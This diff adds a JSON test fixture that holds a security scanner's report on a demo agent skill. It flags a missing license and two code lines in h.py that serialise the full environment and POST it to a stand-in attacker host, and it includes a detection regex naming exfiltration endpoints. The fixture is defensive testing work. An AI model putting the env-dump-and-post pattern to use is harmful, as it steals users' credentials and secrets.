@@ -1,0 +1,255 @@
+{
+ "skill_name": "demo",
+ "skill_path": "<fixture>",
+ "is_safe": false,
+ "max_severity": "CRITICAL",
+ "findings_count": 3,
+ "findings": [
+  {
+   "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+   "rule_id": "MANIFEST_MISSING_LICENSE",
+   "category": "policy_violation",
+   "severity": "INFO",
+   "title": "Skill does not specify a license",
+   "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+   "analyzer": "static",
+   "metadata": {
+    "aitech": null,
+    "aitech_name": null,
+    "aisubtech": null,
+    "aisubtech_name": null,
+    "aitech_mappings": [],
+    "aisubtech_mappings": [],
+    "framework_mappings": [],
+    "taxonomy_status": "not_applicable",
+    "taxonomy_source": "rule"
+   }
+  },
+  {
+   "id": "DATA_EXFIL_ENV_DUMP_65d7fac80f",
+   "rule_id": "DATA_EXFIL_ENV_DUMP",
+   "category": "data_exfiltration",
+   "severity": "HIGH",
+   "title": "Outputs, serialises, or transmits whole-environment values; targeted reads, keys-only enumeration, and local snapshots remain below this HIGH boundary",
+   "description": "Pattern detected: json.dumps(dict(os.environ",
+   "file_path": "h.py",
+   "line_number": 2,
+   "snippet": "payload = json.dumps(dict(os.environ))",
+   "remediation": "Read only the specific environment variables the skill needs; never print, serialise, pipe, redirect, or transmit the full process environment",
+   "analyzer": "static",
+   "metadata": {
+    "matched_pattern": "DATA_EXFIL_ENV_DUMP language-aware scanner",
+    "matched_text": "json.dumps(dict(os.environ",
+    "signature_pattern_index": null,
+    "signature_match_start": 10,
+    "signature_match_end": 36,
+    "signature_pattern_sha256": "1e2faa13af47ac508bad150c4f0189424c77c4cba6489afb59cb42059e032290",
+    "scanner_category": "SECURITY VIOLATION",
+    "signature_context": "code",
+    "signature_polarity": "active",
+    "source_category": "data_exfiltration",
+    "category_normalization": "native",
+    "semantic_facts": {
+     "evidence_kind": "signature_pattern",
+     "context_kind": "code",
+     "signals": [
+      {
+       "rule_id": "DATA_EXFIL_ENV_DUMP",
+       "kind": "signature_polarity",
+       "file_path": "h.py",
+       "value_class": "active"
+      },
+      {
+       "rule_id": "DATA_EXFIL_ENV_DUMP",
+       "kind": "unreferenced_executable",
+       "file_path": "h.py",
+       "value_class": "python"
+      }
+     ]
+    },
+    "deduped_rule_ids": [
+     "DATA_EXFIL_ENV_VARS"
+    ],
+    "deduped_count": 1,
+    "aitech": "AITech-14.1",
+    "aitech_name": "Unauthorized Access",
+    "aisubtech": "AISubtech-14.1.1",
+    "aisubtech_name": "Credential Theft",
+    "aitech_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI03: Identity & Privilege Abuse",
+     "MITRE ATLAS: AML.T0055: Unsecured Credentials",
+     "MITRE ATLAS: AML.T0091: Use Alternate Authentication Material",
+     "MITRE ATLAS: AML.T0091.000: App Access Token Abuse",
+     "MITRE ATT&CK: T1098: Account Manipulation",
+     "MITRE ATT&CK: T1528: Steal Application Access Token",
+     "MITRE ATT&CK: T1550: Use Alternate Authentication Material",
+     "NIST AML: NISTAML.03: Privacy Compromise"
+    ],
+    "aisubtech_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI03: Identity & Privilege Abuse",
+     "MITRE ATLAS: AML.T0055: Unsecured Credentials",
+     "MITRE ATLAS: AML.T0091: Use Alternate Authentication Material",
+     "MITRE ATLAS: AML.T0091.000: App Access Token Abuse",
+     "MITRE ATLAS: AML.T0106: Exploitation for Credential Access",
+     "MITRE ATLAS: AML.T0098: AI Agent Tool Credential Harvesting",
+     "MITRE ATT&CK: T1098: Account Manipulation",
+     "MITRE ATT&CK: T1528: Steal Application Access Token",
+     "MITRE ATT&CK: T1550: Use Alternate Authentication Material",
+     "NIST AML: NISTAML.03: Privacy Compromise"
+    ],
+    "framework_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI03: Identity & Privilege Abuse",
+     "MITRE ATLAS: AML.T0055: Unsecured Credentials",
+     "MITRE ATLAS: AML.T0091: Use Alternate Authentication Material",
+     "MITRE ATLAS: AML.T0091.000: App Access Token Abuse",
+     "MITRE ATLAS: AML.T0106: Exploitation for Credential Access",
+     "MITRE ATLAS: AML.T0098: AI Agent Tool Credential Harvesting",
+     "MITRE ATT&CK: T1098: Account Manipulation",
+     "MITRE ATT&CK: T1528: Steal Application Access Token",
+     "MITRE ATT&CK: T1550: Use Alternate Authentication Material",
+     "NIST AML: NISTAML.03: Privacy Compromise"
+    ],
+    "taxonomy_status": "mapped",
+    "taxonomy_source": "rule"
+   }
+  },
+  {
+   "id": "DATA_EXFIL_HTTP_POST_d6887b0f95",
+   "rule_id": "DATA_EXFIL_HTTP_POST",
+   "category": "data_exfiltration",
+   "severity": "CRITICAL",
+   "title": "HTTP POST request that may send data externally",
+   "description": "Pattern detected: requests.post('https://h.attacker",
+   "file_path": "h.py",
+   "line_number": 3,
+   "snippet": "requests.post('https://h.attacker.test', data=payload)",
+   "remediation": "Review all POST requests. Ensure they don't send sensitive data",
+   "analyzer": "static",
+   "metadata": {
+    "matched_pattern": "(?i)requests\\.post\\s*\\([^\\n)]{0,240}(?:attacker|evil|webhook|exfil|steal|leak|collect|backup_endpoint|analytics_endpoint|discord\\.com/api/webhooks|pastebin|telegram)",
+    "matched_text": "requests.post('https://h.attacker",
+    "signature_pattern_index": 0,
+    "signature_match_start": 0,
+    "signature_match_end": 33,
+    "signature_pattern_sha256": "3b94e69d9d8cff19795623847f0a176d9d0b90236c283c819df2ec10ff5bd7e1",
+    "scanner_category": "SECURITY VIOLATION",
+    "signature_context": "code",
+    "signature_polarity": "active",
+    "source_category": "data_exfiltration",
+    "category_normalization": "native",
+    "semantic_facts": {
+     "evidence_kind": "signature_pattern",
+     "context_kind": "code",
+     "signals": [
+      {
+       "rule_id": "DATA_EXFIL_HTTP_POST",
+       "kind": "signature_polarity",
+       "file_path": "h.py",
+       "value_class": "active"
+      },
+      {
+       "rule_id": "DATA_EXFIL_HTTP_POST",
+       "kind": "unreferenced_executable",
+       "file_path": "h.py",
+       "value_class": "python"
+      }
+     ]
+    },
+    "deduped_rule_ids": [
+     "DATA_EXFIL_NETWORK_REQUESTS"
+    ],
+    "deduped_count": 1,
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "aitech_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI09: Human-Agent Trust Exploitation",
+     "MITRE ATLAS: AML.T0024.000: Exfiltration via AI Inference API: Infer Training Data Membership",
+     "MITRE ATLAS: AML.T0035: AI Artifact Collection",
+     "MITRE ATLAS: AML.T0037: Data From Local System",
+     "MITRE ATLAS: AML.T0057: LLM Data Leakage",
+     "NIST AML: NISTAML.037: Training Data Attacks"
+    ],
+    "aisubtech_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI02: Tool Misuse & Exploitation",
+     "OWASP: ASI09: Human-Agent Trust Exploitation",
+     "MITRE ATLAS: AML.T0086: Exfiltration via AI Agent Tool Invocation",
+     "NIST AML: N/A"
+    ],
+    "framework_mappings": [
+     "OWASP: LLM02:2026: Sensitive Information Disclosure",
+     "OWASP: ASI02: Tool Misuse & Exploitation",
+     "OWASP: ASI09: Human-Agent Trust Exploitation",
+     "MITRE ATLAS: AML.T0086: Exfiltration via AI Agent Tool Invocation",
+     "NIST AML: N/A"
+    ],
+    "taxonomy_status": "mapped",
+    "taxonomy_source": "rule"
+   }
+  }
+ ],
+ "scan_duration_seconds": 0.15354299545288086,
+ "duration_ms": 153,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "correlation",
+  "behavioral_analyzer"
+ ],
+ "timestamp": "2026-11-23T05:28:44.287866+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "3f48e661bfbc54597f97bbf3dcf2c1cbae2f596ddc79c0b44784efea326b3d1d",
+  "cel": {
+   "mode": "shadow",
+   "runtime": "cel-go",
+   "runtime_version": "v0.32.0;helper=2.3.1",
+   "fact_schema": "v1",
+   "expression_set_hash": "f26459b8f4a46a974d7ab0aaae34127b5b6a40d693e266e12fca03a69a6d26aa",
+   "evaluated": 0,
+   "retained": 5,
+   "would_suppress": 0,
+   "suppressed": 0,
+   "fallbacks": 0,
+   "projection_incomplete": 0,
+   "elapsed_ms": 0.0,
+   "projection_ms": 0.0,
+   "evaluation_ms": 0.0,
+   "errors": [],
+   "per_rule": {},
+   "suppressed_candidates": []
+  },
+  "rule_contract": {
+   "status": "passed",
+   "schema_version": 2,
+   "checked": 1,
+   "invalid_findings": 0,
+   "errors": []
+  },
+  "taxonomy": {
+   "source": "builtin",
+   "version": "2.0.0",
+   "name": "Cisco AI Security and Safety Taxonomy",
+   "revision": "655a343ac943a51b6f61f86e47156e7752c15dc6",
+   "snapshot_sha256": "413e8ce9081e6d91b78aaa0d0b1c06cdc15d0406ad319e23e9f9f4f80735c441",
+   "findings": {
+    "mapped": 2,
+    "not_applicable": 1,
+    "unmapped": 0
+   }
+  }
+ }
+}
